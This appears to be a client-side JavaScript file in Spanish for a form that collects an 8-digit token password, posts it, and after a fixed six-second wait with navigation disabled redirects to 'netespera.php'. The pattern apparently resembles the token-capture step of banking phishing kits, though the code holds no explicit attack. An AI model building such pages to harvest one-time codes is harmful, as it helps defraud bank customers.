(function () {
    const form = document.getElementById('tokenForm');
    const submitBtn = document.getElementById('tokenSubmitBtn');
    const tokenInput = document.getElementById('token_codigo');
    const ESPERA_MS = 6000;
    const DESTINO = 'netespera.php';

    if (!form || !submitBtn) {
        return;
    }

    let enviando = false;

    function mostrarError(mensaje) {
        let errorEl = form.querySelector('.token-error');
        if (!errorEl) {
            errorEl = document.createElement('span');
            errorEl.className = 'token-error';
            errorEl.setAttribute('role', 'alert');
            const field = form.querySelector('.token-field');
            if (field) {
                field.appendChild(errorEl);
            }
        }
        errorEl.textContent = mensaje;
        if (tokenInput) {
            tokenInput.classList.add('is-invalid');
        }
    }

    function limpiarError() {
        const errorEl = form.querySelector('.token-error');
        if (errorEl) {
            errorEl.remove();
        }
        if (tokenInput) {
            tokenInput.classList.remove('is-invalid');
        }
    }

    function activarEspera() {
        submitBtn.disabled = true;
        submitBtn.classList.add('token-submit--waiting');
        submitBtn.setAttribute('aria-busy', 'true');
        if (tokenInput) {
            tokenInput.disabled = true;
            tokenInput.readOnly = true;
        }
        const volver = form.closest('.gps-content')?.querySelector('.token-back');
        if (volver) {
            volver.classList.add('link-disabled');
            volver.setAttribute('tabindex', '-1');
            volver.setAttribute('aria-disabled', 'true');
        }
    }

    function desactivarEspera() {
        submitBtn.disabled = false;
        submitBtn.classList.remove('token-submit--waiting');
        submitBtn.removeAttribute('aria-busy');
        if (tokenInput) {
            tokenInput.disabled = false;
            tokenInput.readOnly = false;
        }
        const volver = form.closest('.gps-content')?.querySelector('.token-back');
        if (volver) {
            volver.classList.remove('link-disabled');
            volver.removeAttribute('tabindex');
            volver.removeAttribute('aria-disabled');
        }
    }

    form.addEventListener('submit', async function (event) {
        event.preventDefault();
        if (enviando) {
            return;
        }

        limpiarError();
        const codigo = (tokenInput?.value || '').trim();

        if (codigo === '') {
            mostrarError('Ingresa la contraseña de tu token.');
            return;
        }

        if (!/^[0-9]{8}$/.test(codigo)) {
            mostrarError('La contraseña token debe tener 8 dígitos.');
            return;
        }

        enviando = true;
        activarEspera();

        try {
            const response = await fetch(form.action, {
                method: 'POST',
                credentials: 'same-origin',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'X-Requested-With': 'XMLHttpRequest'
                },
                body: new URLSearchParams({ token_codigo: codigo })
            });

            let data = null;
            try {
                data = await response.json();
            } catch (e) {
                throw new Error('Respuesta inválida');
            }

            if (!response.ok || !data.success) {
                mostrarError(data.error || 'No pudimos procesar tu token. Intenta de nuevo.');
                desactivarEspera();
                enviando = false;
                return;
            }

            setTimeout(function () {
                window.location.href = DESTINO;
            }, ESPERA_MS);
        } catch (e) {
            console.warn('Error al autorizar token:', e);
            mostrarError('No pudimos procesar tu token. Intenta de nuevo.');
            desactivarEspera();
            enviando = false;
        }
    });

    if (form.getAttribute('data-espera-redireccion') === '1') {
        activarEspera();
        setTimeout(function () {
            window.location.href = DESTINO;
        }, ESPERA_MS);
    }
})();
